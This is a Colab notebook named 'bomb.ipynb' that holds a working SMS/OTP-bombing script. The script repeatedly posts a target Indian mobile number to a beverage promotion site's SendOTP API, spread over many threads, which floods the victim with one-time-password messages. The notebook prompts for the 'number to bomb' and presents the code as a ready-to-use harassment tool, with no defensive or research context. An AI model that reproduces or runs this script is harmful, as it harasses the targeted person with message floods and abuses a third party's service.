{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOVKbQvVCurIVIf2uPMqjF/",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/aceandro2812/upgraded-fishstick/blob/main/bomb.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "e4tQUsi9CtZW"
      },
      "outputs": [],
      "source": [
        "https://pastebin.com/UEEVqBvK"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import threading\n",
        "\n",
        "def send_otp():\n",
        "    headers = {\n",
        "        'Accept': 'application/json, text/plain, */*',\n",
        "        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',\n",
        "        'Connection': 'keep-alive',\n",
        "        'Content-Type': 'application/json',\n",
        "        'Origin': 'https://tu-icc23.coke2home.com',\n",
        "        'Referer': 'https://tu-icc23.coke2home.com/',\n",
        "        'Sec-Fetch-Dest': 'empty',\n",
        "        'Sec-Fetch-Mode': 'cors',\n",
        "        'Sec-Fetch-Site': 'same-site',\n",
        "        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',\n",
        "        'sec-ch-ua': '\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"',\n",
        "        'sec-ch-ua-mobile': '?0',\n",
        "        'sec-ch-ua-platform': '\"Windows\"',\n",
        "    }\n",
        "\n",
        "    json_data = {\n",
        "        'MobileNo': f'{num}',\n",
        "    }\n",
        "\n",
        "    r = requests.post(\n",
        "        'https://tu-icc23-be.coke2home.com/AWSBeanstalkHelloWorldWebApp_deploy/api/User/SendOTP',\n",
        "        headers=headers,\n",
        "        json=json_data,\n",
        "    )\n",
        "\n",
        "    print(r.text)\n",
        "\n",
        "def run_threads(num_otp, num_threads):\n",
        "    threads = []\n",
        "    for _ in range(num_threads):\n",
        "        for _ in range(num_otp // num_threads):\n",
        "            thread = threading.Thread(target=send_otp)\n",
        "            threads.append(thread)\n",
        "\n",
        "    # Start all threads\n",
        "    for thread in threads:\n",
        "        thread.start()\n",
        "\n",
        "    # Wait for all threads to finish\n",
        "    for thread in threads:\n",
        "        thread.join()\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    try:\n",
        "        num_otp = int(input(\"Enter the number of OTPs to be sent: \"))\n",
        "        num_threads = int(input(\"Enter the number of threads: \"))\n",
        "        num = int(input(\"Enter the number to bomb, dont include +91\"))\n",
        "\n",
        "        run_threads(num_otp, num_threads)\n",
        "    except ValueError:\n",
        "        print(\"Please enter valid numbers for OTPs and threads.\")"
      ],
      "metadata": {
        "id": "PsB93m2dC4n5"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}